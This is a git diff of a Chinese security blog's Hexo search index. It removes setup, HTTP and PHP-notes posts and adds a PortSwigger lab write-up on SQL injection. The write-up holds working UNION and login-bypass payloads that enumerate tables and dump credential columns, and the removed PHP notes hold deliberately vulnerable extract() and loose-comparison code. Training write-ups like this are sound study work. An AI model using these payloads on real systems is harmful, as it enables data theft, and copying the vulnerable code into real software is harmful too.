@@ -1,250 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>在Mac上搭建个人博客：Hexo + NexT + 自定义域名搭建永久有效的个人博客网站</title>
-    <url>/2026/10/16/mac-hexo-next-custom-domain-blog/</url>
-    <content><![CDATA[本文记录在 Mac 上搭建和维护 Hexo + NexT 博客的过程，涵盖 GitHub Pages、自定义域名与 DNS，并补充 HanLior 网站当前的项目目录、主题、文章阅读和页脚统计配置。
-
-
-配置Github项目在Github右上角点击Repository
-然后去New一个
-
-按照下面的输入配置，名字输入自己想要起的名字就可以
-
-生成密钥ssh-keygen -t rsa -b 4096然后一路回车，可以看到生成到了/Users/cr1sp/.ssh/id_rsa  这里Cr1sp是我电脑的用户名用编辑器打开，去复制id_rsa.pub到github：https://github.com/settings/ssh改变密钥认证方式：ssh-keyscan -t ed25519 github.com &gt;&gt; ~/.ssh/known_hosts测试是否成功：ssh -T git@github.com
-
-如果出现这样的字就是代表可以链接成功
-
-设置账号信息：
-git config --global user.name &quot;HanLior&quot;
-
-设置github邮箱：
-git config --global user.email &quot;你的 GitHub 邮箱&quot;
-
-下载Git这里我用的homebrew下载的git
-1.先安装homebrew/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;
-
-2.通过Homebrew安装Gitbrew install git
-
-3.验证是否安装成功
-出现这样的就是安装成功
-安装node.js1.下载node.jsbrew install node
-
-2.验证是否下载成功node --version
-
-
-搭建Hexo1.切换阿里云镜像源npm config set registry https://registry.npmmirror.com
-
-2.安装cnpmnpm install -g cnpm --registry=https://registry.npmmirror.com
-
-3.用 cnpm 安装 hexocnpm install -g hexo-cli
-
-4.验证是否安装成功
-本地创建Hexo博客文件先在本地目录里面创建一个文件夹
-mkdir blogcd bloghexo init
-
-然后看到blog目录文件里面有这些东西就可以
-
-node_modules: 依赖包public：存放生成的页面scaffolds：生成文章的一些模板source：用来存放你的文章themes：放下下载的主题_config.yml: 博客的核心配置文件（设置主体、标题等属性）
-
-启动cnpm install
-
-启动hexo hexo s -g
-
-访问127.0.0.1:4000
-
-配置域名解析，可以参考这篇文章
-https://www.duheweb.com/post/20210417143744.html
-然后去github配置一下域名，启用https
-
-本站实际配置记录以下配置对应本博客当前使用的 GitHub 仓库和域名：
-
-GitHub 用户：HanLior
-Pages 仓库：HanLior/HanLior.github.io
-域名：www.hanlior.top
-Hexo 项目目录：/Users/cr1sp/blog
-Hexo：8.1.2；NexT：8.21.1，Pisces 风格
-
-目录和发布链路博客源文件放在 /Users/cr1sp/blog。source/_posts 保存文章，source/categories、source/tags 和 source/about 保存导航页面；NexT 配置放在 _config.next.yml。文章图片托管在单独的图床仓库 xhcola/typora_drawing_bed，正文使用 raw.githubusercontent.com 图片链接，不把图片文件混进 Hexo 文章目录。
-发布时，Hexo 先把源文件生成到 public，再由 hexo-deployer-git 把生成结果推送到 Pages 仓库 HanLior/HanLior.github.io 的 main 分支。这个 Pages 仓库用于托管生成后的网站。
-配置 DNS在域名服务商的 DNS 解析页面添加以下记录。根域名用 4 条 A 记录，www 用 CNAME；CNAME 的记录值不要带 https:// 或末尾路径。
-
-
-
-主机记录
-类型
-记录值
-
-
-
-@
-A
-185.199.108.153
-
-
-@
-A
-185.199.109.153
-
-
-@
-A
-185.199.110.153
-
-
-@
-A
-185.199.111.153
-
-
-www
-CNAME
-HanLior.github.io
-
-
-在 GitHub 仓库 HanLior/HanLior.github.io 的 Settings → Pages 中，发布来源选择 Deploy from a branch，分支选择 main、目录选择 /(root)。Custom domain 填 www.hanlior.top。等 DNS 检查和 TLS 证书签发完成后，再启用 Enforce HTTPS。
-在 Hexo 的 source/CNAME 文件中只写自定义域名：
-www.hanlior.top
-
-不要把 CNAME 文件放在 source/_posts 里，也不要把它命名为 CNAME.txt。
-配置 Hexo 部署到 GitHub Pages在博客根目录 /Users/cr1sp/blog 安装部署插件：
-npm install hexo-deployer-git --save
-
-在根目录的 _config.yml 配置仓库和分支：
-deploy:  type: git  repo: git@github.com:HanLior/HanLior.github.io.git  branch: main
-
-每次发布前先清理并重新生成，再部署：
-npx hexo cleannpx hexo generatenpx hexo deploy
-
-也可以依次使用 hexo clean、hexo generate、hexo deploy。第一次在本机部署时需要已经配置 GitHub SSH Key，并确认 ssh -T git@github.com 可以连接。
-安装并启用 NexT 主题本站使用 NexT 8.21.1，主题通过 npm 安装并由 package.json 管理：
-npm install hexo-theme-next@8.21.1 --save
-
-Hexo 根目录 _config.yml 中设置：
-theme: next
-
-主题设置写在博客根目录的 _config.next.yml，不是 themes/next/_config.yml。本站使用 Pisces、深色模式、左侧文章侧栏、中文导航和 GitHub 个人链接：
-scheme: Piscesdarkmode: truesidebar:  position: left  display: postmenu:  home: / || home  categories: /categories/ || th  tags: /tags/ || tags  about: /about/ || usersocial:  GitHub: https://github.com/HanLior || fab fa-github
-
-menu 中的页面需在 source 目录下创建对应页面。本站导航显示首页、分类、标签和关于；归档页面仍可通过 /archives/ 访问，但没有放进主导航。
-archives: /archives/ || archive
-
-创建分类、标签和关于页面可用 Hexo 命令生成页面：
-npx hexo new page categoriesnpx hexo new page tagsnpx hexo new page about
-
-命令会创建 source/&lt;页面名&gt;/index.md。分类页和标签页的 front matter 分别设置 type: categories、type: tags；这些页面以及关于页均可设置 comments: false。例如：
----title: 分类type: categoriescomments: false---
-
-文章通过 front matter 设置分类和标签。本站的分类包括“博客搭建”“逆向学习”和“web安全学习”。Hexo 默认会隐藏没有文章的分类；persistent_categories 配置和 scripts/persistent-categories.js 会让预设分类在文章发布前也能显示。文章归入该分类后，分类页会自动列出文章。
-首页摘要、分页和文章信息本站首页每页显示 10 篇文章。文章使用 &lt;!-- more --&gt; 分隔摘要和正文：首页只显示分隔符之前的内容，读者点击“阅读全文”进入全文。新文章可按下面的结构设置分类、标签和摘要：
----title: 文章标题date: 2026-11-02 16:00:00categories:  - web安全学习tags:  - PHP---这里写首页摘要。&lt;!-- more --&gt;这里开始是文章全文。
-
-字数和预计阅读时间由 hexo-word-counter 生成，只有文章级统计开启，不显示全站总字数或总阅读时间：
-npm install hexo-word-counter --save
-
-Hexo 根目录 _config.yml：
-symbols_count_time:  symbols: true  time: true  total_symbols: false  total_time: false
-
-主题配置 _config.next.yml 控制发表于日期、分类和字数&#x2F;阅读时间布局。source/_data/post-meta.njk 额外显示文章文件的实际修改日期和时间：
-post_meta:  item_text: true  created_at: true  updated_at:    enable: false    another_day: true  categories: truesymbols_count_time:  separated_meta: true  item_text_total: falsecustom_file_path:  postMeta: source/_data/post-meta.njk
-
-项目的 updated_option 设为 mtime，因此文章更新信息根据源文件修改时间生成。自定义元信息模板会把更新日期和时分秒显示在文章标题下方。
-本站开启的搜索和 SEO 基础功能安装搜索索引、Atom 订阅和站点地图插件：
-npm install hexo-generator-searchdb hexo-generator-feed hexo-generator-sitemap --save
-
-Hexo 根目录 _config.yml 中配置搜索索引、订阅和站点地图：
-search:  path: search.xml  field: post  content: true  format: striptagsfeed:  type: atom  path: atom.xml  limit: 20sitemap:  path: sitemap.xml  tags: true  categories: true
-
-NexT 的 _config.next.yml 开启本地搜索：
-local_search:  enable: true  top_n_per_article: 1  unescape: false  preload: false
-
-本站在 _config.next.yml 中开启了 Mac 风格的代码块复制按钮：
-codeblock:  copy_button:    enable: true    style: mac
-
-页脚的访客数和浏览量写在 source/_data/footer.njk，通过兼容不蒜子接口的脚本 https://busuanzi.meuicat.com/js 显示。NexT 内置的不蒜子开关保持关闭，因为原接口曾返回 502。切换到新服务后，访客数和浏览量从新服务开始累计。相同页脚还显示博客运行时间，起点为首次部署记录的北京时间 2026-10-16 18:48:16。
-根目录配置还要填写站点标题、作者、语言、时区和正式网址。本站当前值如下：
-title: HanLiorsubtitle: 技术学习与实践description: HanLior 的个人博客，记录技术学习、项目实践与思考。keywords: Hexo, NexT, HanLiorauthor: HanLiorlanguage: zh-CNtimezone: Asia/Shanghaiurl: https://www.hanlior.top
-
-搜索引擎抓取规则放在 source/robots.txt：
-User-agent: *Allow: /Sitemap: https://www.hanlior.top/sitemap.xml
-
-本站开启了 NexT 深色模式、左侧侧栏、本地搜索和代码复制。网站根目录 _config.yml 还设置每页 10 篇、Atom 订阅、站点地图和 robots.txt。访问统计会在访客打开网页后逐步累计。
-删除默认示例文章Hexo 初始化时会生成 source/_posts/hello-world.md。删除该文件并重新部署后，文章和归档列表里就不会再显示 Hello World。source/index.md 是没有文章时的首页提示；有文章时，首页由文章索引生成器列出文章摘要：
----title: 首页layout: pagecomments: false---文章正在整理中，欢迎稍后再来。
-
-之后写新文章可运行：
-npx hexo new post &quot;文章标题&quot;
-
-完成编辑后再运行清理、生成和部署命令。
-]]></content>
-      <categories>
-        <category>博客搭建</category>
-      </categories>
-      <tags>
-        <tag>Mac</tag>
-        <tag>Hexo</tag>
-        <tag>NexT</tag>
-        <tag>GitHub Pages</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTTP协议学习：从请求头到响应头</title>
-    <url>/2026/10/28/http-protocol-learning/</url>
-    <content><![CDATA[本文结合 moectf 2024 的 ezhttp 题目，整理 HTTP 请求行、常见请求头、请求体，以及响应状态码和响应头。
-
-
-HTTP 请求
-HTTP 请求的第一行叫请求行，包含请求方法、请求目标和 HTTP 版本。常见方法有：
-
-GET：获取指定资源。
-POST：向服务器提交数据，常用于创建或处理资源。
-HEAD：请求与 GET 类似，但只返回响应头，不返回响应体。
-
-请求行下面是请求头，常见字段包括：
-
-Host：请求访问的主机名。
-X-Forwarded-For：代理服务器常用来传递客户端 IP。只有来自可信代理的值才应作为真实来源，因为客户端可能自行伪造它。
-Referer：表示请求从哪个页面发起。
-User-Agent：描述客户端使用的设备、操作系统和浏览器等信息。
-Content-Type：描述请求体的数据格式，例如表单或 JSON。
-
-请求头之后是请求体。题目中的请求体示例为 imoau=sb。如果提交 JSON，请求头中的 Content-Type 通常应设为 application/json；表单数据则使用对应的表单媒体类型。
-HTTP 响应
-服务器响应的第一行包含 HTTP 版本、状态码和状态描述。状态码按范围表示处理结果：
-
-1xx：信息响应，请求仍在处理中。
-2xx：请求已成功处理。
-3xx：需要重定向或进一步操作。
-4xx：请求存在问题，或服务器无法按请求提供资源。
-5xx：服务器处理请求时发生错误。
-
-常见状态码：
-
-200 OK：请求成功。
-301 Moved Permanently：资源已永久迁移，响应会提供新的地址。
-404 Not Found：服务器找不到请求的资源。
-418 I’m a teapot：一个真实定义过的状态码，源自愚人节 RFC，常作为趣味状态码出现。
-500 Internal Server Error：服务器遇到未预期的错误。
-
-响应状态行下面是响应头，常见字段包括：
-
-Server：服务器软件信息；出于安全考虑，服务器可能会隐藏或简化此字段。
-Content-Type：响应体的媒体类型，例如 text/html 或 application/json。
-Set-Cookie：让浏览器保存或更新 Cookie。
-Content-Length：响应体的长度（以字节计，具体行为也受传输方式影响）。
-
-响应头之后是响应体，通常包含浏览器最终显示的页面内容或接口返回的数据。
-]]></content>
-      <categories>
-        <category>web安全学习</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-        <tag>Web安全</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件上传安全：Upload-Labs 绕过思路与防御</title>
     <url>/2026/11/02/file-upload-security/</url>
     <content><![CDATA[本文为 Upload-Labs 本地靶场学习记录，示例仅用于自建或明确授权的测试环境。生产系统应采用严格白名单、服务端内容校验，并将上传文件存放在不可执行目录。
@@ -435,221 +191,9 @@ $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif
         <category>web安全学习</category>
       </categories>
       <tags>
-        <tag>Web安全</tag>
         <tag>文件上传</tag>
         <tag>Upload-Labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP学习笔记：类型比较、超全局变量与面向对象</title>
-    <url>/2026/10/28/php-learning/</url>
-    <content><![CDATA[本文记录 PHP 基础语法、弱类型比较、超全局变量与常见函数，并通过类、对象、构造方法和继承入门面向对象。
-
-
-学习地址
-基础语法PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器
-PHP代码的基本格式
-&lt;?php//PHP代码?&gt;
-
-PHP变量
-变量以 $ 符号开始，后面跟着变量的名称
-
-变量名必须以字母或者下划线字符开始
-
-变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）
-
-变量名不能包含空格
-
-变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
-这些和其他语言的差别不大
-
-
-&lt;?php$x=5;  //给x赋值$y=6;  // $给变量赋值 $z=$x+$y;echo $z;?&gt;
-
-PHP 是一门弱类型语言
-这是什么意思那，就是不必向 PHP 声明该变量的数据类型，和C语言对比，比如c语言定义一个整型变量需要int a; 但是在PHP中就不需要，PHP 会根据变量的值，自动把变量转换为正确的数据类型。
-PHP数据类型和比较
-String（字符串）
-
-Integer（整型）
-
-Float（浮点型）
-
-Boolean（布尔型）
-
-Array（数组）
-
-Object（对象）
-
-NULL（空值）
-
-Resource（资源类型）
-数组这里array() 和其他语言不太一样，重点学习一下
-
-
-&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt;
-
-
-面向对象的部分放在后面写
-类型比较
-注意事项说在前面
-这里我踩了一些坑，刚一开始我用的系统安装的php来跑，发现怎么都得不到想要的flag，后来查询资料得到了原来是因为我安装的php8，版本比较高了，这些都不存在了
-这段代码的关键区别在 $num == 1：PHP 7 会把 &quot;1abc&quot; 转成数字 1；PHP 8 不再这样处理，所以同样的输入在 PHP 7 能得到 flag，在 PHP 8 不能
-所以环境一定要选择对，可以用phpstudy的环境来跑
-
-松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型
-
-严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型
-&lt;?phpif(42 == &quot;42&quot;) &#123;    echo &#x27;1、值相等&#x27;;&#125; echo PHP_EOL; // 换行符 if(42 === &quot;42&quot;) &#123;    echo &#x27;2、类型相等&#x27;;&#125; else &#123;    echo &#x27;3、类型不相等&#x27;;&#125;?&gt;
-
-
-这里让gpt写了一段php代码来学习一下弱类型比较
-&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;PHP 条件判断练习&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form method=&quot;get&quot;&gt;        &lt;label&gt;            输入 num：            &lt;input type=&quot;text&quot; name=&quot;num&quot;&gt;        &lt;/label&gt;        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;    &lt;/form&gt;    &lt;pre&gt;&lt;?php    if (isset($_GET[&#x27;num&#x27;]) &amp;&amp; is_string($_GET[&#x27;num&#x27;])) &#123;        $num = $_GET[&#x27;num&#x27;];        if (!is_numeric($num)) &#123;            // 将输入作为普通文字显示            echo htmlspecialchars($num, ENT_QUOTES, &#x27;UTF-8&#x27;);            if ($num == 1) &#123;                echo &quot;\nflag&#123;**********&#125;&quot;;            &#125;        &#125;    &#125;    ?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
-
-如果输入的是单纯一个数字，什么都不会显示
-
-但是如果输入1abc的话，就会直接出flag
-
-这里的原理就是源代码中
-if ($num == 1) &#123;               echo &quot;\nflag&#123;**********&#125;&quot;;           &#125;
-
-判断一下输入的数字是否和1相等，如果我理解没错的话，要比较的1是一位数组，然后我们输入的是1abc 自动的也就是和第一位的1比较了，然后因为弱类型比较，得到的是true，所以就输出了flag
-超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。
-PHP 超级全局变量列表:
-
-$GLOBALS
-
-$_SERVER
-
-$_REQUEST
-
-$_POST
-
-$_GET
-
-$_FILES
-
-$_ENV
-
-$_COOKIE
-
-$_SESSION
-也就是在这些输入点，可能会导致很多的漏洞点，这里借用一下学长总结的表格
-
-
-
-变量
-用途
-渗透关注点
-
-
-
-$_GET
-URL 参数
-最常见注入入口
-
-
-$_POST
-POST Body
-表单注入入口
-
-
-$_REQUEST
-GET+POST+Cookie
-参数来源混乱，易绕过
-
-
-$_COOKIE
-Cookie
-认证伪造、反序列化
-
-
-$_SESSION
-会话
-会话固定、会话劫持
-
-
-$_SERVER
-服务器信息
-信息泄露、HTTP_* 头伪造
-
-
-$_FILES
-上传文件
-文件上传漏洞
-
-
-$GLOBALS
-全局变量
-变量覆盖
-
-
-
-
-函数PHP中的一些危险函数
-上文中是一些在CTF中出现的一些可能会导致漏洞危险函数
-这里便不再赘述了，因为只学原理不实践的话也没什么意义，所以我选择边实践边学习，遇到了再学
-这里先把extract()学习一下
-extract($_GET)作用是 将GET请求的参数直接解析为变量并覆盖原有变量；
-&lt;?php$flag = &quot;xxxxxxxxxxxx&quot;;extract($_GET);if($secret == &quot;admin&quot;)&#123;echo $flag;&#125;else&#123;echo &quot;Access Denied&quot;;&#125;?&gt;
-
-正常代码无法直接控制 $secret，但是 extract() 会自动创建&#x2F;覆盖任意变量。也就是说：我们在URL传什么参数，服务器就会生成什么变量。
-这里extract接收GET的参数，由于这个函数可以直接覆盖GET到的参数，所以就直接可以在url中加上?secret=admin可以直接覆盖掉原本的参数，直接就可以输出flag
-面向对象可以把它们串成一条线来理解：类定义对象有哪些数据和行为；序列化保存对象的数据；反序列化恢复对象。如果恢复的数据由外部控制，而对象又会自动执行某些操作，就可能产生漏洞。
-这里来学习面向对象,用一下菜鸟教程中的一个汽车的例子
-&lt;?phpclass Car &#123;    public $color;    public function __construct($color = &quot;green&quot;)    &#123;        $this-&gt;color = $color;    &#125;    public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;);echo $car-&gt;describe();?&gt;
-
-这是程序执行之后的结果
-
-这里开始一段一段的分析代码
-class car  定义一个类car，也就相当于car的设计图
-public $color 在类中声明一个名为 color 的公开属性，用于保存每个对象的颜色,也就相当于规定了在Car中都需要有color（颜色）这个属性，意思就是汽车的设计图中得设计一下颜色
-function describe() 在类中定义的一个方法，这个方法的作用就是描述一下这个车的颜色是什么
-$this 表示目前操作的对象，可能也能想象成英语中的代词哈哈
-$car = new Car(&quot;white&quot;)这个代码很关键，这里原本的含义是new一个新对象,用通俗的话来讲就是让工厂按照 Car 这份设计图，生产一辆新车，并在生产时指定颜色为白色，再用 $car 指代这辆车。
-学习反序列化之前，先学习一下__construct()
-__construct() 魔术方法-构造方法 使用 new 创建对象时，PHP 会自动调用它，用来设置对象的初始状态
-这个可以这样理解
-new Car(&quot;white&quot;)       ↓创建一个 Car 对象       ↓自动调用 __construct(&quot;white&quot;)       ↓参数 $color 得到 &quot;white&quot;       ↓$this-&gt;color = $color       ↓新对象的颜色被设置为 &quot;white&quot;
-
-当然，在类和对象中，这个方法也不是必须有的，下面再看一个例子
-class Car&#123;    public $color;&#125;// 没有构造方法，照样可以创建对象$car = new Car();// 创建后，再设置颜色$car-&gt;color = &quot;white&quot;;echo $car-&gt;color; // 输出 white
-
-如果没有构造方法，只能先创建对象，然后给对象设置颜色，当然这里肯定就不能像有构造方法时候直接在new对象时候传递参数，也就是不能这样$car = new Car(&quot;white&quot;);
-当然，有了构造方法，也可以写多个参数，在这里多设置一个价格，也是可以的
-class Car&#123;    public $color;    public $price;    public function __construct($color,$price)    &#123;        $this-&gt;color = $color;        $this-&gt;price = $price;    &#125;  public function describe()    &#123;        return &quot;汽车的颜色是：&quot; . $this-&gt;color;    &#125;&#125;$car = new Car(&quot;white&quot;,1000);echo $car-&gt;color; // whiteecho $car-&gt;price; // 1000
-
-在这里简单的学完构造方法之后，还有一个自定义的方法function describe()&#96;
-在类和对象中，也可以自定义方法，在这个例子中，describe()就是我们自定义的方法，-&gt; 不仅可以用来引用类中的属性，也可以用来引用方法
-我们自定义的这个方法的含义，在这个car的例子来讲的话，可以通俗的理解为用来描述这个车的颜色
-至此为止，我们用通俗易懂的例子学习了面向对象中的类、对象、属性、方法
-再学一个新概念，继承
-例如，“电动车”也是一种“车”，可以继承 Car
-我们已经有一份汽车设计图 Car，现在想设计电动车，可以在汽车设计图的基础上增加电池等功能，不必从头设计。 这就是继承。
-class ElectricCar extends Car&#123;    public $battery;    public function __construct($color, $price, $battery)    &#123;        parent::__construct($color, $price);        $this-&gt;battery = $battery;    &#125;&#125;
-
-这里：
-
-Car 是父类。
-
-ElectricCar 是子类。
-
-extends 表示继承。
-parent::__construct($color, $price);表示：调用父类的构造方法，让它负责设置颜色和价格。
-
-
-现在电动车不仅有自己的 $battery，还可以使用继承来的公开属性和方法
-$car = new ElectricCar(&quot;white&quot;, 1000, 80);
-
-总结目前php的学习就先到这里，在函数的那个部分，等到在ctf的过程中遇到什么就学什么，然后再来补充
-]]></content>
-      <categories>
-        <category>web安全学习</category>
-      </categories>
-      <tags>
         <tag>Web安全</tag>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -1054,9 +598,1032 @@ level19?file=../../../flag
         <category>web安全学习</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>PHP</tag>
         <tag>文件包含</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PortSwigger 靶场实践：SQL 注入</title>
+    <url>/2026/11/04/portswigger-sql-injection-labs/</url>
+    <content><![CDATA[本文记录 PortSwigger Web Security Academy SQL 注入实验的解题过程，涵盖联合查询、数据库信息枚举、盲注、时间延迟、带外交互与 XML 编码过滤绕过。练习内容仅用于 PortSwigger 官方靶场或其他明确授权的环境。
+
+
+Lab1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data提示语句SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1
+在检索类别的时候，还有一个附加条件就是released = 1
+那么我们先查一下category
+
+类别是字符类型的，那么先测试一个单引号,有报错
+
+构造一下payload
+?category=Gifts&#39; or 1=1 --+
+这样和原本的查询语句拼接完之后是这样的
+SELECT * FROM products WHERE category = &#x27;Gifts&#x27; or 1=1 --&#x27; AND released = 1
+
+完整过程可以看成：
+原模板：  category = &#x27; [输入] &#x27; AND released = 1输入：              Gifts&#x27; or 1=1 -- 结果：    category = &#x27;Gifts&#x27; or 1=1 -- &#x27; AND released = 1
+
+–后面的就被注视掉了，所以就把已发布和未发布的商品全都查询出来了
+
+Lab2: SQL injection vulnerability allowing login bypass题目意思是说让在登陆框这里sql注入，使用administrator登陆
+尝试一下用户名为administrator 密码也是，无法登陆
+然后测试一下administrator&#39; 发现有报错提示，那么就有可能有sql注入
+可以猜想一下这里的sql查询是什么样子的
+select **** from user where username=&#x27;administrator&#x27; and password = &#x27;1234123&#x27;
+
+那么我们直接在username里面测试administrator&#39;--
+
+这样构造出来的sql也就是
+select **** from user where username=&#x27;administrator&#x27; --&#x27; and password = &#x27;1234123&#x27;
+
+依旧是–后面的全部都注释掉了，直接实现登陆
+Lab3: SQL injection attack, querying the database type and version on OracleOracle数据库的SQL注入
+这里先学习一下Oracle和Mysql的区别
+
+
+
+目的
+MySQL
+Oracle
+
+
+
+闭合字符串
+&#39;
+&#39;
+
+
+修改条件
+OR 1=1
+OR 1=1
+
+
+统计列数
+ORDER BY 1、ORDER BY 2
+基本一样
+
+
+联合查询
+UNION SELECT
+UNION SELECT
+
+
+查询版本
+@@version 或 version()
+BANNER FROM v$version
+
+
+查看表
+information_schema.tables
+user_tables、all_tables
+
+
+字符串拼接
+CONCAT(a,b)
+&#96;a
+
+
+注释
+-- 、#、/*...*/
+--、/*...*/，一般没有 MySQL 的 #
+
+
+无表查询常量
+SELECT &#39;test&#39;
+常见写法是 SELECT &#39;test&#39; FROM dual
+
+
+这个题是让我们显示出来数据库的版本信息，那就是拼接一下数据库的特有语法union select BANNER from v$version
+
+具体来看一下实现
+要想使用union拼接，肯定要知道查询一下类别会出来几列的数据
+order by 3--报错，那么应该是有两列
+
+直接拼接一下payload
+?category=Gifts&#39;+union+select+BANNER,NULL+from+v$version--就解决了
+
+Lab4: SQL injection attack, querying the database type and version on MySQL and Microsoft查询mysql数据库的版本
+直接拼接一下payload来看一下，盲猜还是两列
+?category=Gifts&#39; union select @@version,NULL--但是不知道为什么出现了报错 
+在--后面加上了一个%20也出了结果
+
+或者直接把--换成%23 也就是#经过url编码之后的也是可以出的，这里后知后觉想起来，最后没加+ 
++ 也会被解析成空格的意思，有点痴呆了
+Lab5: SQL injection attack, listing the database contents on non-Oracle databases直接查到数据库里面存放有用户账号密码的表，直接用查到的账户密码登陆administrator
+依旧还是猜两列，union拼接查询
+?category=Accessories%27union%20select%20table_name,NULL%20from%20information_schema.tables--+
+找到了一个名字为users_gwzllf的一个表，可能是存放着user信息的
+按“表名 → 列名 → 数据”的顺序查
+?category=Accessories%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users_gwzllf%27--+
+然后查到了列名字username_lndcsp password_vhpwtr
+?category=Accessories%27%20UNION%20SELECT%20username_lndcsp%2Cpassword_vhpwtr%20FROM%20users_gwzllf--+
+然后直接从表中查数据，查到数据直接登陆即可
+
+Lab6: SQL injection attack, listing the database contents on Oracle这里先具体来学习一下Oracle数据库的一些具体操作
+前面学到的 SELECT、WHERE、ORDER BY、UNION 思路仍然适用，主要变化是 Oracle 的系统视图和函数。
+Oracle 常见查询：
+-- 查询常量SELECT 1 FROM dual;-- 查询当前用户SELECT USER FROM dual;-- 查询当前 SchemaSELECT SYS_CONTEXT(&#x27;USERENV&#x27;, &#x27;CURRENT_SCHEMA&#x27;)FROM dual;-- 查询 Oracle 版本SELECT bannerFROM v$version;
+
+查询表和列：
+-- 当前用户拥有的表SELECT table_nameFROM user_tables;-- 当前用户有权限访问的表SELECT owner, table_nameFROM all_tables;-- 查询某张表的列SELECT column_name, data_typeFROM user_tab_columnsWHERE table_name = &#x27;USERS&#x27;;
+
+查询数据：
+SELECT *FROM usersWHERE username = &#x27;administrator&#x27;;SELECT username, passwordFROM usersORDER BY username;
+
+限制返回行数：
+-- Oracle 12c 及以上SELECT *FROM usersFETCH FIRST 10 ROWS ONLY;
+
+旧版本也常见：
+SELECT *FROM usersWHERE ROWNUM &lt;= 10;
+
+字符串和常用函数：
+-- 字符串拼接SELECT username || &#x27;:&#x27; || passwordFROM users;-- 字符串长度SELECT LENGTH(username)FROM users;-- 截取字符串SELECT SUBSTR(username, 1, 3)FROM users;-- 空值替换SELECT NVL(email, &#x27;unknown&#x27;)FROM users;
+
+注释：
+-- 单行注释/* 多行注释 */
+
+和 MySQL 的主要区别：
+
+
+
+目的
+MySQL
+Oracle
+
+
+
+查询版本
+@@version
+v$version
+
+
+查询表
+information_schema.tables
+user_tables &#x2F; all_tables
+
+
+查询列
+information_schema.columns
+user_tab_columns
+
+
+字符串拼接
+CONCAT(a,b)
+&#96;a
+
+
+查询常量
+SELECT &#39;x&#39;
+SELECT &#39;x&#39; FROM dual
+
+
+限制行数
+LIMIT 10
+FETCH FIRST 10 ROWS ONLY 或 ROWNUM
+
+
+UNION SELECT 的列数和类型匹配规则仍然一样；需要替换的主要是 MySQL 的 @@version、information_schema 等数据库特有语法。
+进入这道题目,先查表名
+?category=Accessories%27%20union%20select%20table_name,NULL%20from%20all_tables--+
+再查表中的列名
+?category=Gifts%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20user_tab_columns%20WHERE%20table_name=%27USERS_VTTKNZ%27--%20
+
+?category=Gifts%27%20UNION%20SELECT%20USERNAME_ITVHCI%2CPASSWORD_BTZDRV%20FROM%20USERS_VTTKNZ--%20
+
+Lab7: SQL injection UNION attack, determining the number of columns returned by the query利用union查询，返回空列数
+?category=Tech+gifts&#39; order by 1--+
+?category=Tech+gifts&#39; order by 2--+
+?category=Tech+gifts&#39; order by 3--+
+3之后报错，那么查询出来有三列
+直接构造payload
+?category=Tech+gifts%27%20union%20select%20NULL,NULL,NULL--+
+Lab8: SQL injection UNION attack, finding a column containing text将给的随机值在网页中显示出来
+利用union查询，返回空列数
+?category=Tech+gifts&#39; order by 1--+
+?category=Tech+gifts&#39; order by 2--+
+?category=Tech+gifts&#39; order by 3--+
+3之后报错，那么查询出来有三列，那么就一个一个尝试
+?category=Accessories%27%20union%20select%20NULL,%27KRMjR4%27,NULL--+
+
+这里深究一下原因
+第一类是列类型不同。原查询的三列可能类似：
+第 1 列：数字，例如商品 ID第 2 列：字符，例如商品名称或描述第 3 列：数字、日期或其他类型
+
+所以：
+NULL, &#x27;KRMjR4&#x27;, NULL
+
+可以执行，因为第二列接收字符串，第一和第三列用 NULL 占位。
+第二类是应用页面只渲染了第二列。数据库返回三列，但后端模板可能只使用其中一个字段，例如伪代码：
+rows = db.execute(sql)for row in rows:    html += &quot;&lt;h3&gt;&quot; + row[1] + &quot;&lt;/h3&gt;&quot;
+
+或者 ORM 映射后，页面模板只显示：
+product.name
+
+而 row[0] 和 row[2] 可能被当作 ID、价格、图片地址等字段，没有直接显示。
+Lab9: SQL injection UNION attack, retrieving data from other tables常见关系型数据库查询版本的方法如下：
+
+
+
+数据库
+普通查询
+
+
+
+MySQL &#x2F; MariaDB
+SELECT VERSION();
+
+
+MySQL &#x2F; MariaDB
+SELECT @@version;
+
+
+PostgreSQL
+SELECT version();
+
+
+PostgreSQL
+SHOW server_version;
+
+
+Oracle
+SELECT banner FROM v$version;
+
+
+Oracle
+SELECT version FROM product_component_version;
+
+
+SQL Server
+SELECT @@VERSION;
+
+
+SQL Server
+SELECT SERVERPROPERTY(&#39;ProductVersion&#39;);
+
+
+SQLite
+SELECT sqlite_version();
+
+
+Snowflake
+SELECT CURRENT_VERSION();
+
